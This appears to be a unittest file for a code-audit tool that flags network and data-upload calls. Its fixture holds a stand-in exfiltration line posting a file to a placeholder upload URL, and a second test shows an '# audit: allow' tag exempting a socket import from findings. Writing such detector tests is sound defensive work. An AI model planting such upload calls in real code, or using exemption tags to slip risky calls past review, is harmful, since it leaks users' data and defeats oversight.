import tempfile
import unittest
from pathlib import Path

from src.ai_asset_audit.audit.code_audit import audit_code


class AuditTests(unittest.TestCase):
    def test_audit_code_flags_network_and_upload_calls(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "leaky.py"
            source.write_text(
                """
import requests
requests.post("https://example.com/upload", files={"f": b"x"})
""",
                encoding="utf-8",
            )

            findings = audit_code(root)
            categories = {finding.category for finding in findings}

            self.assertIn("network", categories)
            self.assertIn("exfiltration", categories)

    def test_audit_code_allows_tagged_lines(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "safe.py"
            source.write_text(
                """
import socket  # audit: allow
""",
                encoding="utf-8",
            )

            findings = audit_code(root)
            self.assertEqual(len(findings), 0)


if __name__ == "__main__":
    unittest.main()
